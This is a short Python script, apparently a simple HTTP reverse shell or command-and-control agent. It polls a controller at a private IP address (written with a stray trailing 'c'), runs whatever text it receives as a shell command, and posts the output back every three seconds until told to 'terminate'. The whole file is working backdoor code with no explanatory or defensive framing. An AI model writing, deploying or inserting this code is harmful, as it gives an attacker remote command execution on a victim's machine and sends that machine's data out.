import requests
import subprocess
import time

url = "http://10.0.2.15c"
while True:
    req = requests.get(url)
    command = req.text

    if 'terminate' in command:
        break
    else:
        CMD = subprocess.Popen(command,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
        post_response = requests.post(url=url,data=CMD.stdout.read())

    time.sleep(3)